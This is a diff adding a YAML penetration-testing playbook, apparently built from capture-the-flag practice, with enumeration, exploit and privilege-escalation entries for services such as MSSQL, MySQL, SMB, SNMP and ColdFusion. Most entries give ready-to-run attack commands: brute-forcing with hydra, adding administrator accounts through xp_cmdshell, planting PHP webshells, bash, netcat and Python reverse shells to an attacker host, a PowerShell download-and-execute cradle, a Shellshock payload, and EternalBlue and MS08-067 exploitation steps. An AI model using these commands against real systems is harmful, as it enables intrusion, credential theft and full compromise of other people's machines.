+          nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse <targetip> -p1433 --script-args mssql.username=sa,mssql.password=<sql_password>,ms-sql-xp-cmdshell.cmd="net user anderson cooper /add"
+          nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse <targetip> -p1433 --script-args mssql.username=<sql_user>,mssql.password=<sql_password>,ms-sql-xp-cmdshell.cmd="net localgroup administrators anderson /add"
+          nmap -vv -sV -Pn -p <targetport> --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-sa <targetip>
+        ports:
+          - 1433/tcp
+        references:
+          - 
+      enumerate_proto_mysql:
+        description: 
+        cli: |
+          nmap --script=mysql-* <targetip>
+          bruteforce:
+            hydra -ufl /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt mysql://<targetip>
+            nmap -p 3306 --script mysql-brute --script-args userdb=/usr/share/wordlists/mysql_users.txt,passdb=/usr/share/wordists/rockyou.txt -vv <targetip>
+          create a reverse shell:
+            select '<?php exec($_GET["cmd"]); ?>' from store into dumpfile '/var/www/https/blogblog/wp-content/uploads/shell.php'
+          udf:
+            if mysql is running as root AND /usr/lib/lib_mysqludf_sys.so file is present, we can privesc
+
+          nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <targetip> -p <targetport>
+          hydra -s <targetport> -C ./wordlists/mysql-default-userpass.txt -u -f <targetip> mysql
+        ports:
+          - 3306/tcp
+        references:
+          - 
+      enumerate_proto_nfs:
+        description:
+        cli: |
+          nmap -sV --script=nfs-* <targetip>
+          showmount -e <targetip>
+        ports:
+          - 111/tcp
+          - 111/udp
+          - 2049/tcp
+          - 2049/udp
+        references:
+          - 
+      enumerate_proto_oracle:
+        description: 
+        cli: |
+          msfcli auxiliary/scanner/oracle/tnslsnr_version rhosts=<targetip> E
+          msfcli auxiliary/scanner/oracle/sid_enum rhosts=<targetip> E
+          tnscmd10g status -h <targetip>
+          hydra -uf -P /usr/share/wordlists/metasploit/unix_passwords.txt <targetip> -s 1521 oracle-listener
+        ports:
+          - 1521/tcp
+        references:
+          - 
+      enumerate_proto_postgres:
+        description: 
+        cli: |
+          hydra -s <targetport> -C /usr/share/sparta/wordlists/postgres-default-userpass.txt -u -f <targetip> postgres
+          hydra -ufl /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <targetip> -s 1521 postgres
+        ports:
+          - 1521/tcp
+        references:
+          - 
+      enumerate_proto_rdp:
+        description: 
+        cli: |
+          perl /usr/share/sparta/scripts/rdp-sec-check.pl <targetip>:<targetport>
+          ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://<targetip>
+        ports:
+          - 3389/tcp
+        references:
+          - 
+      enumerate_proto_rpc:
+        description: 
+        cli: |
+          rpcinfo -p <targetip>
+        ports:
+          - 135/tcp
+          - 111/tcp
+        references:
+          - 
+      enumerate_proto_smb:
+        description: 
+        cli: |
+          locate all smb scripts on kali and run them to gather details:
+            locate *.nse | grep smb
+          try enum4linux to get open shares, permissions and local users:
+            enum4linux -a <targetip>
+          nbtscan -vhr <targetip>
+          scans:
+            nmap -p139,445 --script smb-vuln-* --script-args=unsafe=1 <targetip>
+            nmap -p139,445 --script smb-enum-* --script-args=unsafe=1 <targetip>
+            null sessions: bash -c "echo 'srvinfo' | rpcclient -U % <targetip>"
+            groups: nmap -vv -p139,445 --script=smb-enum-groups <targetip>
+            users: bash -c "echo 'enumdomusers' | rpcclient -U % <targetip>"
+            admins: net rpc group members "Domain Admins" -U % -I <targetip>
+            shares: nmap -vv -p139,445 --script=smb-enum-shares <targetip>
+            sessions: nmap -vv -p139,445 --script=smb-enum-sessions <targetip>
+            policies: nmap -vv -p139,445 --script=smb-enum-domains <targetip>
+            version: use auxiliary/scanner/smb/smb_version
+            bruteforce: use auxiliary/scanner/smb/smb_login
+
+          bash -c "echo 'enumdomusers' | rpcclient <targetip> -U%"
+          bash -c "echo 'srvinfo' | rpcclient <targetip> -U%"
+          bash /usr/share/sparta/scripts/smbenum.sh <targetip>
+          enum4linux <targetip>
+          nbtscan -v -h <targetip>
+          net rpc group members "Domain Admins" -I <targetip> -U%
+          nmap -p<targetport> --script=smb-enum-domains <targetip> -vvvvv
+          nmap -p<targetport> --script=smb-enum-groups <targetip> -vvvvv
+          nmap -p<targetport> --script=smb-enum-sessions <targetip> -vvvvv
+          nmap -p<targetport> --script=smb-enum-shares <targetip> -vvvvv
+          nmap -sV -Pn -vv -p <targetport> --script=smb-vuln* --script-args=unsafe=1 <targetip>
+          python /usr/share/doc/python-impacket-doc/examples/samrdump.py <targetip> <targetport>/SMB
+          smbclient -L <targetip>
+          smbclient //<targetip>/admin$ -U john
+          smbclient //<targetip>/ipc$ -U john
+          smbclient //<targetip>/tmp
+          smbclient \\<targetip>\ipc$ -U john
+          winexe -U username //<targetip> "cmd.exe" --system
+        ports:
+          - 139/tcp
+          - 445/tcp
+        references:
+          - 
+      enumerate_proto_smb_anonymous_access:
+        description: open shares, anonymous logins
+        cli: |
+          # connect to and explore smb share:
+            smbclient -N -L \\\\<targetip>
+            smbclient -N \\\\<targetip>\\$share
+          # look for null sessions "allows sessions using username '', password ''", use smbclient to connect and explore smb share:
+            enum4linux -a <targetip>
+            smbclient -U "" //<targetip>/share$ (password: "")
+            smbclient //<targetip>/share$ -U lazysysadmin -p 445
+        ports:
+          - 139/tcp
+          - 445/tcp
+        references:
+          - 
+      enumerate_proto_smtp:
+        description: 
+        cli: |
+          smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t <targetip> -p <targetport>
+          smtp-user-enum -M EXPN -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t <targetip> -p <targetport>
+          smtp-user-enum -M RCPT -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t <targetip> -p <targetport>
+          # send email:
+            swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 192.168.92.167:2525 --body "My kid will be a soccer player" --header "Subject: My kid will be a soccer player"
+        ports:
+          - 25/tcp
+        references:
+          - 
+      enumerate_proto_snmp:
+        description: 
+        cli: |
+          snmpcheck -t <targetip>
+          nmap -sU -p 161 --script=*snmp* <targetip>
+          xprobe2 -v -p udp:161:open <targetip>
+          use auxiliary/scanner/snmp/snmp_login
+          use auxiliary/scanner/snmp/snmp_enum
+          enumerate open ports, running services and applications:
+            snmpwalk -v2c -c public <targetip> .
+            snmp-check -t 5 -c public <targetip>
+          scan using multiple community strings:
+            echo public >community
+            echo private >>community
+            echo manager >>community
+            for ip in $(seq 200 254); do echo 10.11.1.${ip}; done >ips
+            onesixtyone -c community -i ips
+            onesixtyone -c /usr/share/wordlists/dirb/small.txt <targetip>
+          enumerate windows users:
+            snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25
+            for i in $(cat /usr/share/wordlists/metasploit/unix_users.txt); do snmpwalk -v 1 -c $i 192.168.1.200; done | grep -e "Timeout"
+          enumerate current windows processes:
+            snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2
+          enumerate windows open tcp ports:
+            snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3
+          enumerate installed software:
+            snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2
+        ports:
+          - 161/tcp
+        references:
+          - 
+      enumerate_proto_ssh:
+        description: 
+        cli: |
+          authorized_keys:
+            ssh-keygen -t rsa -b 2048
+              enter a custom filename
+            copy contents of <filename>.pub to /home/<username>/.ssh/authorized_keys
+            ssh -i <filename>.pub <username>@<targetip>
+          ssh enum:
+            msf > use auxiliary/scanner/ssh/ssh_enumusers
+            msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 10.11.1.0/24
+            msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+            msf auxiliary(scanner/ssh/ssh_enumusers) > set THREADS 254
+            msf auxiliary(scanner/ssh/ssh_enumusers) > run
+        ports:
+          - 22/tcp
+        references:
+          - 
+      enumerate_proto_sql:
+        description: 
+        cli: |
+          locate all sql scripts on kali and run them to gather details:
+            locate *.nse | grep sql
+        ports:
+          - 1433/tcp
+        references:
+          - 
+      enumerate_proto_sql_ssis_dtsconfig:
+        description: The `.dtsConfig` files are used by [SQL Server Integration Services (SSIS)](https://en.wikipedia.org/wiki/SQL_Server_Integration_Services) and can contain plaintext credentials for SQL users.
+        cli: |
+          cat *.dtsConfig
+        ports:
+          - 1433/tcp
+        references:
+          - 
+      enumerate_proto_telnet:
+        description: 
+        cli: |
+          nmap -p 23 --script telnet-brute --script-args userdb=/usr/share/metasploit-framework/data/wordlists/unix_users,passdb=/usr/share/wordlists/rockyou.txt,telnet-brute.timeout=20s <targetip>
+          use auxiliary/scanner/telnet/telnet_version
+            msf auxiliary(telnet_version) > set RHOSTS 10.11.1.0/24
+            msf auxiliary(telnet_version) > set THREADS 254
+            msf auxiliary(telnet_version) > run
+          use auxiliary/scanner/telnet/telnet_login
+            msf auxiliary(telnet_login) > set BLANK_PASSWORDS false
+            msf auxiliary(telnet_login) > set PASS_FILE passwords.txt
+            msf auxiliary(telnet_login) > set RHOSTS 10.11.1.0/24
+            msf auxiliary(telnet_login) > set THREADS 254
+            msf auxiliary(telnet_login) > set USER_FILE users.txt
+            msf auxiliary(telnet_login) > set VERBOSE false
+            msf auxiliary(telnet_login) > run
+        ports:
+          - 23/tcp
+        references:
+          - 
+      enumerate_proto_webdav:
+        description: 
+        cli: |
+          default pass for xampp: wampp/xampp
+          test uploading different file extensions:
+            davtest -url http://10.11.1.10
+          test uploading different file extensions, with given creds:
+            davtest -url http://10.11.1.10 -auth username:password
+          remove files uploaded during test:
+            davtest -cleanup
+          create a reverse shell (asp file even if not allowed)
+          connect to webdav share, bypass upload restrictions:
+            cadaver http://10.11.1.10
+            mkdir temp
+            cd temp
+            put revshell.asp revshell.txt
+            copy revshell.txt revshell.asp
+          open nc to catch reverse shell connection
+          browse webdav share and open uploaded file
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - 
+    exploit:
+      exploit_apache_tomcat:
+        description: leverage Tomcat Web Application Manager to deploy a malicious .war file that spawns a reverse shell
+        cli: |
+          msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -f war >backdoor.war
+          # deploy war file through tomcat manager
+          # start netcat listener and visit the link for uploaded jsp file to trigger webshell
+          jar -xvf backdoor.war
+          http://<targetip>:<targetport>/<.war filename w/o extension>/<.jsp filename in war archive w/ extension>
+        references:
+          - https://0xrick.github.io/hack-the-box/jerry/
+      exploit_bash_reverseshell:
+        description: spawn a bash reverse shell to gain interactive access on the target system
+        cli: |
+          nc -nlvp <attackerport>
+          rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attackerip> <attackerport> >/tmp/f
+        references:
+          - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+          - https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells
+      exploit_bof:
+        description: create a bof exploit to execute arbitrary code and gain interactive access on the target system
+        cli: |
+        references:
+          -
+      exploit_cmdexec:
+        description: execute arbitrary commands via a command execution vulnerability and gain interactive access on the target system
+        cli: |
+          nc -nlvp <attackerport>
+          bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1
+        references:
+          -
+      exploit_coldfusion_dirtraversal:
+        description: coldfusion 8 is vulnerable to a directory traversal and exposes SHA1 hash of the user password
+        cli: |
+          http://<targetip>:<targetport>/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+        references:
+          - https://medium.com/@_C_3PJoe/htb-retired-box-write-up-arctic-50eccccc560
+          - https://www.exploit-db.com/exploits/14641
+      exploit_coldfusion_scheduledtasks:
+        description: coldfusion 8 allows to obtain remote shell by creating and executing a new scheduled task. this is a post-authentication vulnerability
+        cli: |
+          http://<targetip>:<targetport>/CFIDE/administrator/enter.cfm
+          http://<targetip>:<targetport>/CFIDE/administrator/settings/mappings.cfm # check the CFIDE logical path mapping to identify the file upload location, C:\ColdFusion8\wwwroot\CFIDE
+          msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -f raw >revshell.jsp
+          nc -nlvp <attackerport>
+          http://<targetip>:<targetport>/CFIDE/administrator/scheduler/scheduletasks.cfm
+            # set url to revshell.jsp link
+            # mark the save output to file option
+            # set file to C:\ColdFusion8\wwwroot\CFIDE\revshell.jsp
+          # run the scheduled task on demand to upload the revshell.jsp file
+            http://<targetip>:<targetport>/CFIDE/revshell.jsp
+        references:
+          - https://medium.com/@_C_3PJoe/htb-retired-box-write-up-arctic-50eccccc560
+      exploit_credsreuse:
+        description: Reuse credentials already found for a service to interact with another service
+        cli: |
+        references:
+          -
+      exploit_defaultcreds:
+        description: Use default credentials to interact with a service
+        cli: |
+        references:
+          - 
+      exploit_drupal_passwordcrack:
+        description: Crack a drupal password hash
+        cli: |
+          hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
+        references:
+          - https://0xdf.gitlab.io/2019/03/12/htb-bastard.html
+      exploit_ftp_anonymous:
+        description: Interact with the ftp service using `anonymous/any` credentials
+        cli: |
+        references:
+          - 
+      exploit_ftp_web_root:
+        description: FTP server's root directory is mapped to the web server's root directory. Upload a reverse shell file native to the web server using ftp server (`anonymous` login or default creds or creds reuse or some exploit) and trigger it's execution to gain interactive access on the target system
+        cli: |
+        references:
+          - 
+      exploit_gpp_groupsxml:
+        description: the Groups.xml file lists username and encrypted password that can be useful to gain initial access on the target system. access this file via an open ftp/smb share or some other method
+        cli: |
+          smbclient //10.10.10.100/Replication
+          get ..\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml Groups.xml
+          exit
+          cat Groups.xml 
+          gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+          smbclient //10.10.10.100/Users -U SVC_TGS
+        references:
+          - https://0xrick.github.io/hack-the-box/active/
+          - https://adsecurity.org/?p=2288
+      exploit_hfs_cmd_exec:
+        description: HFS (`HttpFileServer 2.3.x`) is vulnerable to remote command execution
+        cli: |
+          python 39161.py <targetip> <targetport>
+        references:
+          - https://www.exploit-db.com/exploits/39161
+          - https://nvd.nist.gov/vuln/detail/CVE-2014-6287
+      exploit_iis_asp_reverseshell:
+        description: use an `asp`|`aspx` reverse shell to gain interactive access on the target system. useful when Microsoft IIS server is found during enumeration. might need a separate vulnerability to upload the reverse shell file on target system (use burp to bypass filename filter - revshell.aspx%00.jpg)
+        cli: |
+          msfvenom -p windows/shell/reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -f asp >rs.asp
+          msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -f aspx >rs.aspx
+        references:
+          - https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-aspx-shells
+      exploit_iis_webdav:
+        description: multiple iis webdav issues. can use msf exploits `windows/iis/iis_webdav_scstoragepathfromurl` or `windows/iis/iis_webdav_upload_asp` to gain interactive access on the target system
+        cli: |
+          msfconsole
+            use windows/iis/iis_webdav_scstoragepathfromurl
+              set rhost <targetip>
+              set rport <targetport>
+              show options
+              exploit
+            use windows/iis/iis_webdav_upload_asp
+              set rhost <targetip>
+              set rport <targetport>
+              show options
+              exploit
+        references:
+          - https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl
+          - https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp
+      exploit_lotuscms:
+        description: LotusCMS is vulnerable to remote code execution
+        cli: |
+          nc -nlvp <attackerport>
+          ./lotusRCE.sh <targetip>
+        references:
+          - https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh
+      exploit_modssl:
+        description: Apache `mod_ssl < 2.8.7` is vulnerable to remote code execution
+        cli: |
+          gcc -o 47080 47080.c -lcrypto
+          ./47080
+            0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+          ./47080 0x6b <targetip> <targetport>
+        references:
+          - https://www.exploit-db.com/exploits/47080
+          - https://nvd.nist.gov/vuln/detail/CVE-2002-0082
+      exploit_mongodb:
+        description: 
+        cli: |
+          nc -nlvp <attackerport>
+            mongo -p -u <user> <record>
+              db.tasks.insert({"cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerip> <attackerport> >/tmp/f"})
+              bye
+        references:
+          - 
+      exploit_nfs_rw:
+        description: when an open nfs share is found, look for available mountpoints, mount using `nfsv3` so that we can see the real remote `uid` and `gid`, create a new user with expected `uid`, switch user, create the `.ssh` directory, copy `id_rsa.pub` to this directory and ssh to gain interactive access on the target system
+        cli: |
+          check available mountpoints
+          mount file system via nfs v3
+          check uid of user
+          create a new local user with nfs user's uid
+          change to new user
+          copy ssh public key to .ssh/authorized_keys file
+          ssh into the target as user
+          copy root owned copy of bash from local system to nfs mount
+          running "./bash -p" gives root access as euid is carried over during copy operation
+          mount nfsv3, create new user with nfs user uid and get root shell
+          unmount and remove temporary user:
+            showmount -e <targetip>
+            mkdir /tmp/nfs
+            mount <targetip>:/home/vulnix /tmp/nfs -o vers=3 # nfs v3 allows listing of user ids for shared files
+            ls -l /tmp/nfs # check the uid and use it to create new user
+            useradd -u 2008 vulnix
+            su vulnix
+            copy ~/.ssh/id_rsa.pub to ~/.ssh/authorized_keys on target host to gain passwordless ssh access
+            umount /tmp/nfs ; userdel vulnix
+
+          showmount -e <targetip>
+            Export list for <targetip>:
+            /home/vulnix *
+            mkdir ./mnt/
+          mount <targetip>:/home/vulnix ./mnt -o vers=3
+          ls -l
+          groupadd --gid 2008 vulnix ; useradd --uid 2008 --groups vulnix vulnix
+          cp ~/.ssh/id_rsa.pub ./authorized_keys
+          su vulnix
+          cd ./mnt/
+          mkdir .ssh/
+          cp ./authorized_keys ./.ssh/
+          exit
+          ssh vulnix@<targetip>
+        references:
+          - https://blog.christophetd.fr/write-up-vulnix/
+      exploit_nodejs:
+        description: inspect source for `assets/js/app/controllers/*.js` files and look for rest api calls that could leak sensitive information
+        cli: |
+        references:
+          - 
+      exploit_nodejs_deserialize:
+        description: user input is passed to `unserialize()` method that could allow remote code execution
+        cli: |
+        references:
+          - https://dastinia.io/write-up/hackthebox/2018/08/25/hackthebox-celestial-writeup/
+          - https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py
+          - https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
+          - https://0xdf.gitlab.io/2018/08/25/htb-celestial.html
+      exploit_pchart:
+        description: the `pChart 2.1.3` web application is vulnerable to directory traversal
+        cli: |
+          http://<targetip>/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd
+        references:
+          - https://www.exploit-db.com/exploits/31173
+          - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/zpanel_information_disclosure_rce.rb
+      exploit_pfsense:
+        description: pfsense 2.1.3 is vulnerable to command injection
+        cli: |
+          python3 43560.py --rhost <targetip> --lhost <attackerip> --lport <attackerport> --username foo --password bar
+        references:
+          - https://www.exploit-db.com/exploits/43560
+          - https://medium.com/@ranakhalil101/hack-the-box-sense-writeup-w-o-metasploit-ef064f380190
+      exploit_php_acs_rfi:
+        description: Advanced Comment System 1.0 is vulnerable to remote file inclusion and command execution attacks
+        cli: |
+          curl -v "<targetip>/internal/advanced_comment_system/admin.php?ACS_path=php://input%00" -d "<?system('whoami');?>"
+        references:
+          - https://www.exploit-db.com/exploits/9623
+      exploit_php_fileupload:
+        description: certain poorly developed php web applications allow unrestricted file uploads that can be abused to gain interactive access on the target system
+        cli: |
+          cp /usr/share/webshells/php/php-reverse-shell.php ./rs.php
+          subl rs.php # point to <attackerip> and <attackerport>
+          nc -nlvp <attackerport>
+          # upload rs.php and trigger execution
+        references:
+          - 
+      exploit_php_fileupload_bypass:
+        description: add gif file magicbytes `GIF891` to a php reverse shell file, rename it to rs.php.gif and upload to bypass upload filter. sometimes, a restrictve waf might still stop file upload. in that case, use a minimal command execution php file with gif magicbytes instead of a full php reverse shell
+        cli: |
+          cp /usr/share/webshells/php/php-reverse-shell.php ./rs.php.gif
+          subl rs.php.gif # point to <attackerip> and <attackerport> AND add GIF89a to the start of file
+          nc -nlvp <attackerport>
+          # upload rs.php.gif and trigger execution
+          ###
+          echo -e 'GIF89a\n<?php $out=$_GET["cmd"]; echo `$out`; ?>' >cmd.gif
+          # upload and execute commands
+        references:
+          - 
+      exploit_php_reverseshell:
+        description: use php reverse shell code with an exploit to gain interactive access on the target system
+        cli: |
+        references:
+          - 
+      exploit_php_webshell:
+        description: use the php web shell to execute arbitrary commands and gain interactive access on the target system
+        cli: |
+        references:
+          - 
+      exploit_phptax:
+        description: the `Phptax 0.8` web application is vulnerable to remote code execution
+        cli: |
+          GET /phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E HTTP/1.1
+            Host: <targetip>:<targetport>
+            User-Agent: Mozilla/4.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+          GET /phptax/data/rce.php?cmd=uname%20-a HTTP/1.1
+            Host: <targetip>:<targetport>
+        references:
+          - https://www.exploit-db.com/exploits/25849
+      exploit_psexec_login:
+        description: If credentials for a non-administrative user are available, we can use `psexec.py` to connect and gain interactive access to the target system.
+        cli: |
+          psexec <username>@<targetip>
+        references:
+          - 
+      exploit_prtg_sensors:
+        description: execute a reverse shell command through prtg sensor creation dialog and play it to get interactive access on the target system
+        cli: |
+          ./46527.sh -u http://<targetip> -c "<prtg session cookie>"
+          psexec.py pentest@10.10.10.152
+        references:
+          - https://www.exploit-db.com/exploits/46527
+          - https://nvd.nist.gov/vuln/detail/CVE-2018-9276
+          - https://hipotermia.pw/htb/netmon
+          - https://snowscan.io/htb-writeup-netmon/#
+      exploit_python_reverseshell:
+        description: use a python reverse shell to gain interactive access on the target system
+        cli: |
+          nc -nlvp 9999
+          http://<targetip>/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attackerip>",<attackerport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+        references:
+          - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+          - https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell
+      exploit_shellshock:
+        description: 
+        cli: |
+          curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://<targetip>/cgi-bin/user.sh
+        references:
+          - https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/
+          - https://blog.knapsy.com/blog/2014/10/07/basic-shellshock-exploitation/
+      exploit_smb_ms08_067:
+        description: (netapi exploit) for microsoft windows xp systems with open smb ports, use the [ms08-067](https://github.com/andyacer/ms08_067) metasploit module [`windows/smb/ms08_067_netapi`]()
+        cli: |
+          nmap -p 445 -script smb-check-vulns -script-args=unsafe=1 <targetip>
+          msfcli auxiliary/scanner/smb/ms08_067_check rhosts=<targetip> threads=100 E
+          manual:
+            wget https://raw.githubusercontent.com/andyacer/ms08_067/master/ms08_067_2018.py
+            msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+            nc -nlvp <attackerport>
+            python ms08_067_2018.py <targetip> <osid> <targetport>
+          msf:
+            use exploit/windows/smb/ms08_067_netapi
+            set RHOST <targetip>
+            set LHOST <attackerip>
+            show options
+            exploit
+        ports:
+          - 139/tcp
+          - 445/tcp
+        references:
+          - https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067
+          - https://github.com/andyacer/ms08_067
+          - https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
+          - https://blog.rapid7.com/2014/02/03/new-ms08-067/
+          - https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
+      exploit_smb_ms17_010:
+        description: (eternalblue exploit) for microsoft windows system with smb v1 enbaled, use the metasploit exploit `windows/smb/ms17_010_eternalblue`
+        cli: |
+          nmap -p 445 -script smb-check-vulns -script-args=unsafe=1 <targetip>
+          manual:
+            wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
+            msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
+            nc -nlvp <attackerport>
+            python send_and_execute.py <targetip> revshell.exe
+          msf:
+            use exploit/windows/smb/ms17_010_eternalblue
+            set RHOST <targetip>
+            set LHOST <attackerip>
+            show options
+            exploit
+        ports:
+          - 139/tcp
+          - 445/tcp
+        references:
+          - https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
+          - https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue
+          - https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
+          - https://github.com/helviojunior/MS17-010/send_and_execute.py
+      exploit_smb_nullsession:
+        description: smb null sessions leak a lot of sensitive information about the target system. it could be useful to access open shares or to get sensitive information
+        cli: |
+        references:
+          - 
+      exploit_smb_usermap:
+        description: samba 3.0.0 - 3.0.25rc3 is vulnerable to remote command execution
+        cli: |
+          nc -nlvp <attackerport>
+          sudo apt install python python-pip
+          pip install --user pysmb
+          git clone https://github.com/amriunix/CVE-2007-2447.git
+          cd CVE-2007-2447/
+          python usermap_script.py <targetip> 139 <attackerip> <attackerport>
+        references:
+          - https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+          - https://github.com/amriunix/CVE-2007-2447
+      exploit_smb_web_root:
+        description: smb shared directory is mapped to the web server's root directory. read files to obtain sensitive information or upload a reverse shell file native to the web server and trigger it's execution to gain interactive access on the target system
+        cli: |
+        references:
+          - 
+      exploit_sql_login:
+        description: login to the target system using a sql service account
+        cli: |
+          mssqlclient.py -windows-auth "<username>@<targetip>"
+        references:
+          - 
+      exploit_sql_xpcmdshell:
+        description: use the SQL xp_cmdshell method to gain command execution on the target system
+        cli: |
+            SELECT IS_SRVROLEMEMBER('sysadmin') ## check if current sql user has db sysadmin role, continue if true
+
+            EXEC sp_configure 'Show Advanced Options', 1;
+            reconfigure;
+            sp_configure;
+            EXEC sp_configure 'xp_cmdshell', 1
+            reconfigure;
+
+            xp_cmdshell "whoami"
+
+            type shell.ps1 ## create a powershell reverse shell
+              xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<attackerip>/shell.ps1\");"
+            python3 -m http.server 80 ## serve the reverse shell via http
+            ufw allow from <targetip> proto tcp to any port 80,<attackerport> ## allow incoming connection from <targetip>
+            nc -nlvp <attackerport> ## listen for incoming reverse shell connection
+        references:
+          - 
+      exploit_sqli:
+        description: target system is running a webapp that's vulnerable to sql injection
+        cli: |
+          sqlmap -u "http://<targetip>:<targetport>/<vulnwebapp>/index.php" --batch --forms --dump
+        references:
+          - 
+      exploit_ssh_authorizedkeys:
+        description: if we have access to a user's `.ssh` directory, copy our `id_rsa.pub` file to `.ssh/authorized_keys` to obtain passwordless ssh access
+        cli: |
+        references:
+          - 
+      exploit_ssh_bruteforce:
+        description: use hydra to bruteforce ssh password for a know user
+        cli: |
+          hydra -l anne -P "/usr/share/wordlists/rockyou.txt" -e nsr -s 22 ssh://<targetip>
+        references:
+          - 
+      exploit_ssl_heartbleed:
+        description: use nmap nse script to confirm heartbleed vulnerability and then sensepost exploit to dump memory from target system
+        cli: |
+            nmap --script=ssl-heartbleed -p <targetport> <targetip>
+            python $HOME/toolbox/scripts/heartbleed-poc/heartbleed-poc.py -n10 -f dump.bin <targetip> -p <targetport>
+            strings dump.bin
+        references:
+          - https://github.com/sensepost/heartbleed-poc
+      exploit_wordpress_defaultcreds:
+        description: target system has wordpress configured with default credentials `admin/admin`
+        cli: |
+        references:
+          - 
+      exploit_wordpress_plugin:
+        description: certain wordpress installations might have a `/plugins/` directory that could provide source files or leak sensitive information
+        cli: |
+        references:
+          - 
+      exploit_wordpress_plugin_activitymonitor:
+        description: wordpress plugin `Plainview Activity Monitor` is vulnerable to remote command injection
+        cli: |
+        references:
+          - https://www.exploit-db.com/exploits/45274
+      exploit_wordpress_plugin_hellodolly:
+        description: wordpress plugin `Hello Dolly` (default on stock wp installs) file `hello.php` is modified with php reverse shell code to gain interactive access on the target system
+        cli: |
+        references:
+          - 
+      exploit_wordpress_template:
+        description: edit a wordpress template file, like `404.php` and add php reverse shell code within it to gain interactive access on the target system
+        cli: |
+        references:
+          -
+    privesc:
+      privesc_anansi:
+        description: the `anansi_util` application has `sudo` privileges. use it to run manual commands and upon error run `!/bin/bash` to execute root shell
+        cli: |
+          sudo /home/anansi/bin/anansi_util manual cat /etc/shadow
+            - (press RETURN) !/bin/bash
+        references:
+          - 
+      privesc_bash_reverseshell:
+        description: bash reverse shell command
+        cli: |
+          bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1
+        references:
+          - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
